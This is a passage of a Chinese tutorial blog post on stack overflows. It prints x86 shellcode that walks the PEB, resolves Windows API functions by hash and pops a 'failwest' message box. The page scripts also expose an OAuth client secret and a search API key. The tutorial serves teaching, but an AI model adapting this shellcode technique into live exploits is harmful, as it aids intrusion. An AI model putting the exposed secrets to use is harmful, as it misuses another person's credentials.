class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	_asm&#123;</span><br><span class="line">			nop</span><br><span class="line">			nop	</span><br><span class="line">			</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			CLD					; clear flag DF</span><br><span class="line">			;store hash</span><br><span class="line">			push <span class="number">0x1e380a6a</span>		;hash of MessageBoxA</span><br><span class="line">			push <span class="number">0x4fd18963</span>		;hash of ExitProcess</span><br><span class="line">			push <span class="number">0x0c917432</span>		;hash of LoadLibraryA</span><br><span class="line">			mov esi,esp			; esi = addr of first function hash </span><br><span class="line">			lea edi,[esi<span class="number">-0xc</span>]	; edi = addr to start writing function </span><br><span class="line"></span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			; make some <span class="built_in">stack</span> space</span><br><span class="line">			xor ebx,ebx</span><br><span class="line">			mov bh, <span class="number">0x04</span> 			 </span><br><span class="line">			sub esp, ebx </span><br><span class="line">			</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">			; push a pointer to <span class="string">"user32"</span> onto <span class="built_in">stack</span> </span><br><span class="line">			mov bx, <span class="number">0x3233</span> 		; rest of ebx is null </span><br><span class="line">			push ebx </span><br><span class="line">			push <span class="number">0x72657375</span> </span><br><span class="line">			push esp </span><br><span class="line">			</span><br><span class="line">			xor edx,edx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		; find base addr of kernel32.dll </span><br><span class="line">			mov ebx, fs:[edx + <span class="number">0x30</span>] 	; ebx = address of PEB </span><br><span class="line">			mov ecx, [ebx + <span class="number">0x0c</span>] 		; ecx = pointer to loader data </span><br><span class="line">			mov ecx, [ecx + <span class="number">0x1c</span>] 		; ecx = first entry in initialisation order <span class="built_in">list</span> </span><br><span class="line">			mov ecx, [ecx] 				; ecx = second entry in <span class="built_in">list</span> (kernel32.dll) </span><br><span class="line">			mov ebp, [ecx + <span class="number">0x08</span>] 		; ebp = base address of kernel32.dll </span><br><span class="line">			</span><br><span class="line">						</span><br><span class="line">		find_lib_functions: </span><br><span class="line">		</span><br><span class="line">			lodsd 					; load next hash into al <span class="keyword">and</span> increment esi </span><br><span class="line">			cmp eax, <span class="number">0x1e380a6a</span>		; hash of MessageBoxA - trigger </span><br><span class="line">									; LoadLibrary(<span class="string">"user32"</span>) </span><br><span class="line">			jne find_functions </span><br><span class="line">			xchg eax, ebp 			; save current hash </span><br><span class="line">			call [edi - <span class="number">0x8</span>] 		; LoadLibraryA </span><br><span class="line">			xchg eax, ebp 			; restore current hash, <span class="keyword">and</span> update ebp </span><br><span class="line">									; with base address of user32.dll </span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">		find_functions: </span><br><span class="line">			pushad 						; preserve registers </span><br><span class="line">			mov eax, [ebp + <span class="number">0x3c</span>]		; eax = start of PE header </span><br><span class="line">			mov ecx, [ebp + eax + <span class="number">0x78</span>]	; ecx = relative offset of <span class="keyword">export</span> table </span><br><span class="line">			add ecx, ebp 				; ecx = absolute addr of <span class="keyword">export</span> table </span><br><span class="line">			mov ebx, [ecx + <span class="number">0x20</span>] 		; ebx = relative offset of names table </span><br><span class="line">			add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">			xor edi, edi 				; edi will count through the functions </span><br><span class="line"></span><br><span class="line">		next_function_loop: </span><br><span class="line">			inc edi 					; increment function counter </span><br><span class="line">			mov esi, [ebx + edi * <span class="number">4</span>] 	; esi = relative offset of current function name </span><br><span class="line">			add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">			cdq 						; <span class="function">dl will hold <span class="title">hash</span> <span class="params">(we know eax is small)</span> </span></span><br><span class="line"><span class="function">			</span></span><br><span class="line">		hash_loop: </span><br><span class="line">			movsx eax, byte ptr[esi]</span><br><span class="line">			cmp al,ah</span><br><span class="line">			jz compare_hash</span><br><span class="line">			ror edx,<span class="number">7</span></span><br><span class="line">			add edx,eax</span><br><span class="line">			inc esi</span><br><span class="line">			jmp hash_loop</span><br><span class="line"></span><br><span class="line">		compare_hash:	</span><br><span class="line">			cmp edx, [esp + <span class="number">0x1c</span>] 		; <span class="function">compare to the requested <span class="title">hash</span> <span class="params">(saved on <span class="built_in">stack</span> from pushad)</span> </span></span><br><span class="line"><span class="function">			jnz next_function_loop </span></span><br><span class="line"><span class="function">			</span></span><br><span class="line"><span class="function">		 </span></span><br><span class="line">			mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table </span><br><span class="line">			add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">			mov di, [ebx + <span class="number">2</span> * edi] 	; di = ordinal number of matched function </span><br><span class="line">			mov ebx, [ecx + <span class="number">0x1c</span>] 		; ebx = relative offset of address table </span><br><span class="line">			add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">			add ebp, [ebx + <span class="number">4</span> * edi] 	; <span class="function">add to <span class="title">ebp</span> <span class="params">(base addr of <span class="keyword">module</span>)</span> the </span></span><br><span class="line"><span class="function">										</span>; relative offset of matched function </span><br><span class="line">			xchg eax, ebp 				; move func addr into eax </span><br><span class="line">			pop edi 					; edi is last onto <span class="built_in">stack</span> in pushad </span><br><span class="line">			stosd 						; write function addr to [edi] <span class="keyword">and</span> increment edi </span><br><span class="line">			push edi </span><br><span class="line">			popad					; restore registers </span><br><span class="line">					 				; loop until we reach end of last hash </span><br><span class="line">			cmp eax,<span class="number">0x1e380a6a</span></span><br><span class="line">			jne find_lib_functions </span><br><span class="line"></span><br><span class="line">		function_call:</span><br><span class="line">			xor ebx,ebx</span><br><span class="line">			push ebx			<span class="comment">// cut string</span></span><br><span class="line">			push <span class="number">0x74736577</span></span><br><span class="line">			push <span class="number">0x6C696166</span>		<span class="comment">//push failwest</span></span><br><span class="line">			mov eax,esp			<span class="comment">//load address of failwest</span></span><br><span class="line">			push ebx	</span><br><span class="line">			push eax</span><br><span class="line">			push eax</span><br><span class="line">			push ebx</span><br><span class="line">			call [edi - <span class="number">0x04</span>] ; <span class="comment">//call MessageboxA</span></span><br><span class="line">			push ebx</span><br><span class="line">			call [edi - <span class="number">0x08</span>] ; <span class="comment">// call ExitProcess</span></span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="收尾"><a href="#收尾" class="headerlink" title="收尾"></a>收尾</h2><p>本篇的shellcode尚不完美，jmp esp目前也是手动获取的，但本文的主要目的是在于梳理栈溢出的基础，在接下来的几篇文章中，会不断完善这个Shellcode，包括绕过一些安全措施等等。</p>
+
+            
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/专栏/">专栏</a> <a class="tag tag--primary tag--small t-link" href="/tags/漏洞/">漏洞</a> <a class="tag tag--primary tag--small t-link" href="/tags/通关/">通关</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--disabled">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/04/25/Integer_OverFlow/" data-tooltip="整数溢出" aria-label="NEXT: 整数溢出">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2018/08/07/stackOverFlow_1/" title="Share on Weibo">
+                    <i class="fa fa-weibo" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/07/stackOverFlow_1/&amp;title=通关栈溢出（一）：原理及初级攻击" title="Share on QQ">
+                    <i class="fa fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2018/08/07/stackOverFlow_1/" title="Share on Qzone">
+                    <i class="fa fa-star" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2018/08/07/stackOverFlow_1/" title="Share on Renren">
+                    <i class="fa fa-renren" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a class="post-action-btn btn btn--default" href="#gitment">
+                         <i class="fa fa-comment-o"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+                <div id="gitment"></div>
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2018 CytQ. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a class="post-action-btn btn btn--disabled">
+                
+                    <i class="fa fa-angle-left" aria-hidden="true"></i>
+                    <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                    <a class="post-action-btn btn btn--default tooltip--top" href="/2018/04/25/Integer_OverFlow/" data-tooltip="整数溢出" aria-label="NEXT: 整数溢出">
+                
+                    <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                    <i class="fa fa-angle-right" aria-hidden="true"></i>
+                </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="Share this post">
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2018/08/07/stackOverFlow_1/" title="Share on Weibo">
+                    <i class="fa fa-weibo" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/07/stackOverFlow_1/&amp;title=通关栈溢出（一）：原理及初级攻击" title="Share on QQ">
+                    <i class="fa fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2018/08/07/stackOverFlow_1/" title="Share on Qzone">
+                    <i class="fa fa-star" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a class="post-action-btn btn btn--default" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2018/08/07/stackOverFlow_1/" title="Share on Renren">
+                    <i class="fa fa-renren" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a class="post-action-btn btn btn--default" href="#gitment">
+                         <i class="fa fa-comment-o"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+    <i id="btn-close-shareoptions" class="fa fa-close"></i>
+    <ul class="share-options">
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://imlzq.com/2018/08/07/stackOverFlow_1/">
+                    <i class="fa fa-weibo" aria-hidden="true"></i><span>Share on Weibo</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://imlzq.com/2018/08/07/stackOverFlow_1/&amp;title=通关栈溢出（一）：原理及初级攻击">
+                    <i class="fa fa-qq" aria-hidden="true"></i><span>Share on QQ</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://imlzq.com/2018/08/07/stackOverFlow_1/">
+                    <i class="fa fa-star" aria-hidden="true"></i><span>Share on Qzone</span>
+                </a>
+            </li>
+        
+            
+            
+            <li class="share-option">
+                <a class="share-option-btn" target="new" href="http://widget.renren.com/dialog/share?resourceUrl=http://imlzq.com/2018/08/07/stackOverFlow_1/">
+                    <i class="fa fa-renren" aria-hidden="true"></i><span>Share on Renren</span>
+                </a>
+            </li>
+        
+    </ul>
+</div>
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-remove"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/headicon.png" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">CytQ</h4>
+        
+            <div id="about-card-bio"><p>Software Engineer<br>Android、移动安全、逆向、漏洞挖掘</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>17本科，现任职百度</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker"></i>
+                <br/>
+                Beijing
+            </div>
+        
+    </div>
+</div>
+
+        
+            <div id="algolia-search-modal" class="modal-container">
+    <div class="modal">
+        <div class="modal-header">
+            <span class="close-button"><i class="fa fa-close"></i></span>
+            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+                <span class="searchby-algolia-text text-color-light text-small">by</span>
+                <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+            </a>
+            <i class="search-icon fa fa-search"></i>
+            <form id="algolia-search-form">
+                <input type="text" id="algolia-search-input" name="search"
+                    class="form-control input--large search-input" placeholder="Search "
+                    />
+            </form>
+        </div>
+        <div class="modal-body">
+            <div class="no-result text-color-light text-center">no post found</div>
+            <div class="results">
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/11/22/序言/">
+                            <h3 class="media-heading">序言</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Nov 22, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/11/23/Volley-Lrucache-DiskLrucache/">
+                            <h3 class="media-heading">三级缓存 + AndroidStudio导出jar包 + upload to github</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Nov 23, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p>　　想了半天都没想出来写什么作为第一篇博客比较好，突然发现这次项目的版本控制是github，三级缓存和屏幕适配又是一个跑不掉的话题，就以这些话题开始我的博客之旅吧，同时总结一下在AndroidStudio中如何导出jar包。    </p>
+<pre><code>([参考郭霖的blog](http://blog.csdn.net/guolin_blog/article/details/28863651))
+([参考李晨玮的blog](http://www.cnblogs.com/lichenwei)/)
+
+不管是提升用户体验还是提升APP的流畅度，三级缓存都是必不可少的，在这里就先总结一下三级缓存的使用。
+</code></pre><p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/11/23/screensuit/">
+                            <h3 class="media-heading">三种屏幕适配的方式</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Nov 23, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p>​    第一篇博客总结了三级缓存／AndroidStudio打包jar包／上传基本文件到github,　第二篇就接着总结一下三种屏幕适配的方式。</p>
+<p>在这里也推荐一下<a href="http://blog.csdn.net/lmj623565791?viewmode=contents" target="_blank" rel="noopener">张鸿洋</a>的博客，关注挺久了，和<a href="http://blog.csdn.net/guolin_blog" target="_blank" rel="noopener">郭霖</a>的都很好。</p>
+<p>第一种方式，dimens中设置不同dp值，来达到适配的目的<br>第二种方式，利用第三方百分比库<br>第三种方式，利用第三方库：AutoLayout </p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/11/24/全局变量的处理/">
+                            <h3 class="media-heading">全局变量的处理</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Nov 24, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p>　　很多时候APP会莫名其妙的崩溃，尤其是一些配置很低的收集，重现场景就是在APP切换到后台后，闲置了一段时间后再继续使用时，就会崩溃。<br>　　导致上述崩溃发生的一个可能罪魁祸首就是全局变量，在内存不足的时候，系统会回收一部分闲置的资源，由于APP被切换到了后台，所以之前存放的全局变量很容易被回收，这是再切换到前台继续使用，在使用某个全局变量的时候，就会因为全局变量的值为空而崩溃。<br>　　要解决这个问题，就一定要使用序列化技术。</p>
+<p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/11/25/Android自动填写验证码/">
+                            <h3 class="media-heading">Android自动填写验证码</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Nov 25, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p>　　第四篇博客就来总结下项目中使用到的一个提升用户体验的功能：　Android自动填写验证码<br>　　从字面上来看，很明显的可以看出它的实现流程：监听-&gt;有改变-&gt;获取信息-&gt;改变ui</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/12/01/引导页_视差显示/">
+                            <h3 class="media-heading">引导页_视差显示</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Dec 1, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p>当用户下载完APP后，第一次启动时通常会有一个引导页，而这个引导页对于引导用户或介绍本产品有着很好的作用。一般三种方式实现：</p>
+<ol>
+<li>Viewpager<br>这种方式很简单，易实现，但是在观赏性上来说很差，没有任何动画</li>
+<li>视差显示<br>这种方式是基于ViewPager的，通过自定义其中的类，或者调整其中的方法来达到显示的效果。<br>　在ViewPager中，有一个接口叫做PageTransformer，其中有一个方法transformPage,我们通过在这个方法中编写逻辑就可以实现视差显示。而之所以叫做视差显示，是因为实现这种方式是对不同的控件设置不同的速度来达到的。例如，ViewPager移动了10dp,　图片A移动了15dp, 图片B移动了7.5dp，这就产生了一个视差。</li>
+<li>Html5<br>这种方式也是最近使用得越来越多的方式，通过加载h5来实现引导页的炫目效果。</li>
+</ol></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/12/01/手势/">
+                            <h3 class="media-heading">手势</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Dec 1, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p>这里介绍的只是一个简单的DEMO，根据官方的API还可以进行自定义手势的编写，具体的内容就以后遇到了再说，在本项目中也只起一个开后门的验证作用,毕竟一个没有后门的APP不是一个好APP。</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/12/07/Json数据的解析_Gson/">
+                            <h3 class="media-heading">Json数据的解析_Gson</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Dec 7, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p>一些简单的JSON格式解析可以直接使用JSONObject和JSONArray来解析，但是面对比较复杂或者是数据量较大的JSON数据时就需要使用fastJSON和Gson来解析了，这样的效率和效果都更好。</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/12/08/ViewPager取消预加载/">
+                            <h3 class="media-heading">ViewPager取消预加载</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Dec 8, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p>ViewPager在设计的时候有一个预加载的机制，也就是如果你处于当前这个page界面时,会预先加载下一个page。但是有的时候设计到网络请求，就需要取消掉这个预加载。</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-body">
+                        <a class="link-unstyled" href="http://imlzq.com/2015/12/20/Note-&gt;Rxjava/">
+                            <h3 class="media-heading">RxJava学习笔记</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Dec 20, 2015
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p>学习自扔物线的文章<a href="http://gank.io/post/560e15be2dca930e00da1083。" target="_blank" rel="noopener">http://gank.io/post/560e15be2dca930e00da1083。</a></p>
+<p>粗略学习了最近越来越火的RxJava，进行一个简单的学习总结，这篇博客只涉及使用，不涉及原理</p>
+<blockquote>
+<p>Github：<br><a href="https://github.com/ReactiveX/RxJava" target="_blank" rel="noopener">https://github.com/ReactiveX/RxJava</a><br><a href="https://github.com/ReactiveX/RxAndroid" target="_blank" rel="noopener">https://github.com/ReactiveX/RxAndroid</a> </p>
+</blockquote>
+<p>使用方式:</p>
+<blockquote>
+<p>compile ‘io.reactivex:rxjava:1.0.14’<br>compile ‘io.reactivex:rxandroid:1.0.1’ </p>
+</blockquote>
+<p>我的相关博文：<br><a href="http://blog.csdn.net/jonstank2013/article/details/50574871" target="_blank" rel="noopener">RxJava使用示例（一）： 实现Rxbus代替eventbus</a><br><a href="http://blog.csdn.net/jonstank2013/article/details/50981404" target="_blank" rel="noopener">RxJava实现原理探索</a></p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+            </div>
+        </div>
+        <div class="modal-footer">
+            <p class="results-count text-medium"
+                data-message-zero="no post found"
+                data-message-one="1 post found"
+                data-message-other="{n} posts found">
+                52 posts found
+            </p>
+        </div>
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-peofhqjkzcghmndknakluequy1y6owxdwpaqyju9ntl9zxnk7rdolb3rjjoj.min.js"></script>
+<!--SCRIPTS END-->
+
+    
+        <script type="text/javascript">
+            (function() {
+                function render() {
+                    new Gitment({
+                        id: 'http://imlzq.com/2018/08/07/stackOverFlow_1/',
+                        owner: 'CytQ',
+                        repo: 'BlogComments',
+                        oauth: {
+                            client_id: 'eddb24a604957d55b0fc',
+                            client_secret: '5c1a27d80b9c1978faa1d488b34d606b77529b77',
+                        }
+                    }).render('gitment');
+                }
+                var gc = document.createElement('script');
+                gc.type = 'text/javascript';
+                gc.src = '//imsun.github.io/gitment/dist/gitment.browser.js';
+                gc.charset = 'UTF-8';
+                gc.onload = render;
+                gc.async = true;
+                document.querySelector('body').appendChild(gc);
+                var gcs = document.createElement('link');
+                gcs.href = '//imsun.github.io/gitment/style/default.css';
+                gcs.type = 'text/css';
+                gcs.rel = 'stylesheet';
+                gcs.media = 'screen,print';
+                document.querySelector('head').appendChild(gcs);
+            })();
+	    </script>
+    
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.14.1/moment-with-locales.min.js"></script>
+    <script src="//cdn.jsdelivr.net/algoliasearch/3/algoliasearch.min.js"></script>
+    <script>
+        var algoliaClient = algoliasearch('S730SA64YT', '66519eebbcfbe3a23d50e47efa19798f');
+        var algoliaIndex = algoliaClient.initIndex('Blog');
+    </script>
+
+
+    </body>
+</html>
